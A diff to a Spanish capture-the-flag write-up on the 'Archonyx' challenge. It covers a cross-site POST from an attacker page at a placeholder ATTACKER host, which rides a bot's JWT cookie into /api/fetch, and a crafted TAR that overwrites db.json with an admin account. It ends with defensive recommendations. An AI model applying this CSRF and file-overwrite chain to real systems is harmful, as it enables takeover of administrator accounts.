@@ -97,11 +97,52 @@ exports.submitSupport = (req, res) => {
 };
 ```
 
-El bot generaba un JWT válido, lo almacenaba en una cookie `HttpOnly` para el origen interno de Archonyx y abría la URL controlada con Chromium.
+El bot generaba un JWT válido para el usuario `bot`, iniciaba Chromium y configuraba la cookie directamente para el origen interno de Archonyx:
 
-La cookie no podía leerse desde una página externa.
+```javascript
+const token = jwt.sign(
+  {
+    username: 'bot',
+    role: 'warden'
+  },
+  jwtSecret
+);
 
-Pero no era necesario leerla.
+browser = await puppeteer.launch({
+  headless: 'new',
+  args: [
+    '--no-sandbox',
+    '--disable-setuid-sandbox',
+    '--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure',
+    '--disable-popup-blocking',
+  ],
+});
+
+const page = await browser.newPage();
+
+await page.setCookie({
+  name: 'token',
+  value: token,
+  url: `http://${appHost}:${port}/`,
+  path: '/',
+  httpOnly: true,
+});
+```
+
+La cookie era `HttpOnly`, por lo que una página externa no podía leer directamente su contenido.
+
+Pero no era necesario robarla.
+
+El detalle crítico estaba en la configuración del navegador. El bot deshabilitaba explícitamente dos protecciones de Chromium:
+
+```text
+SameSiteByDefaultCookies
+CookiesWithoutSameSiteMustBeSecure
+```
+
+Además, la cookie se instalaba sin especificar un atributo `SameSite`.
+
+Esto permitía que un formulario `POST` entre sitios enviara la cookie autenticada hacia el origen interno. Con las protecciones SameSite modernas activas, un POST cross-site de este tipo normalmente no incluiría una cookie tratada como `Lax`.
 
 La aplicación habilitaba globalmente ambos parsers:
 
@@ -128,7 +169,7 @@ Por tanto, una página externa podía enviar un formulario tradicional:
   <input
     type="hidden"
     name="url"
-    value="https://ATTACKER/combo.tar"
+    value="https://ATTACKER/stage1.tar"
   >
 </form>
 
@@ -137,17 +178,21 @@ Por tanto, una página externa podía enviar un formulario tradicional:
 </script>
 ```
 
-Cuando el bot visitaba esa página, el navegador enviaba el formulario al origen interno incluyendo automáticamente su sesión.
+Cuando el bot visitaba esta página, el formulario provocaba una navegación `POST` hacia `/api/fetch`.
+
+Como Chromium se ejecutaba con las protecciones SameSite deshabilitadas, el navegador incluía la cookie JWT del bot en esa petición.
 
 La primera capacidad obtenida fue:
 
 ```text
-Navegación controlada
-→ petición autenticada
-→ descarga remota ejecutada como bot
+bot con protecciones SameSite deshabilitadas
+→ cookie JWT instalada para el origen interno
+→ formulario POST entre sitios
+→ /api/fetch con sesión del bot
+→ descarga remota autenticada
 ```
 
-No se robó la cookie. Se utilizó indirectamente.
+No se robó la cookie. Se utilizó indirectamente desde el navegador del bot.
 
 ## 3. El detalle que convirtió una descarga en una escritura
 
@@ -357,7 +402,7 @@ La primera sobrescritura se dirigió contra:
 /app/data/db.json
 ```
 
-Se generó una contraseña conocida:
+Primero se eligió una contraseña conocida:
 
 ```text
 ArchonyxAdmin123!
@@ -373,15 +418,31 @@ node -e \
   )"
 ```
 
-El TAR contenía un nuevo `db.json` con:
+El hash utilizado fue:
+
+```text
+$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a
+```
+
+Después se construyó un TAR cuyo contenido sobrescribía `db.json` con:
 
 - un usuario `admin`;
 - rol `ledgermaster`;
 - estado `verified: true`;
-- el hash controlado;
+- el hash bcrypt conocido;
 - conservación del usuario `bot`.
 
 Mantener al bot era necesario porque su JWT ya emitido contenía el nombre de usuario, pero determinadas rutas volvían a buscarlo en la base de datos.
+
+La secuencia causal era:
+
+```text
+generar bcrypt conocido
+→ incorporarlo al db.json controlado
+→ sobrescribir /app/data/db.json
+→ iniciar sesión como admin
+→ obtener acceso ledgermaster
+```
 
 La página maliciosa y el TAR se alojaron en un servidor controlado.
 
@@ -389,7 +450,7 @@ Al enviar la URL mediante `/report`, el servidor atacante observó:
 
 ```text
 GET /stage1.html
-GET /combo.tar
+GET /stage1.tar
 ```
 
 ![El bot solicita la página controlada y el TAR](../assets/01-bot-fetch-requests.png)
@@ -397,7 +458,7 @@ GET /combo.tar
 Eso confirmó:
 
 1. que el bot abrió la página;
-2. que el formulario ejecutó `/api/fetch`;
+2. que el formulario ejecutó `/api/fetch` con su sesión;
 3. que Archonyx descargó y extrajo el TAR.
 
 Después, el login con la contraseña conocida devolvió:
@@ -413,8 +474,9 @@ Y `/ledgermaster/` respondió correctamente.
 La tercera capacidad quedó establecida:
 
 ```text
-sobrescritura arbitraria
+bcrypt conocido
 → db.json controlado
+→ sobrescritura arbitraria
 → identidad ledgermaster
 → acceso administrativo
 ```
@@ -670,7 +732,7 @@ Antes de interpretar un fallo como defensa de la aplicación, era necesario veri
 
 ```text
 GET stage1.html → 200
-GET combo.tar   → 200 y TAR válido
+GET stage1.tar  → 200 y TAR válido
 GET /enter      → instancia correcta
 ```
 
@@ -684,8 +746,10 @@ La cadena completa puede resumirse en términos de capacidades obtenidas.
 
 ```text
 /report
-→ bot visita URL
-→ formulario entre orígenes
+→ bot instala una cookie JWT
+→ Chromium con protecciones SameSite deshabilitadas
+→ bot visita la página controlada
+→ formulario POST entre sitios
 → /api/fetch con sesión del bot
 ```
 
@@ -705,8 +769,10 @@ extracción antes de validación
 ### 3. Escritura → identidad privilegiada
 
 ```text
-db.json controlado
-→ bcrypt conocido
+bcrypt conocido
+→ db.json controlado
+→ sobrescritura del almacenamiento
+→ login como admin
 → ledgermaster
 ```
 
@@ -732,6 +798,8 @@ Archonyx no cayó por un único fallo.
 La explotación fue posible porque varias decisiones inseguras se reforzaban entre sí:
 
 - navegación arbitraria mediante un bot autenticado;
+- ejecución del bot con las protecciones SameSite de Chromium deshabilitadas;
+- cookie del bot configurada sin un atributo `SameSite` explícito;
 - ausencia de protección CSRF;
 - aceptación de formularios URL-encoded en una acción sensible;
 - extracción remota antes de la validación;
@@ -756,9 +824,11 @@ La defensa debe romper la cadena en varias capas.
 - restringir URLs y protocolos;
 - bloquear loopback, rangos privados y redirecciones peligrosas;
 - utilizar una red aislada;
+- no deshabilitar `SameSiteByDefaultCookies` ni `CookiesWithoutSameSiteMustBeSecure`;
+- definir explícitamente `SameSite=Lax` o `SameSite=Strict` en la cookie;
 - implementar tokens CSRF;
 - validar `Origin` y `Referer`;
-- revisar la política `SameSite` según el flujo requerido.
+- evitar que una página externa pueda provocar acciones autenticadas sobre el origen interno.
 
 ### En el procesamiento de archivos
 
@@ -784,7 +854,7 @@ Archonyx no exigía descubrir una vulnerabilidad extraordinaria.
 Exigía reconocer que cuatro primitivas de capas diferentes podían componerse:
 
 ```text
-navegador
+navegador y SameSite
 → cookies y CSRF
 → TAR y hardlinks
 → inodes y permisos
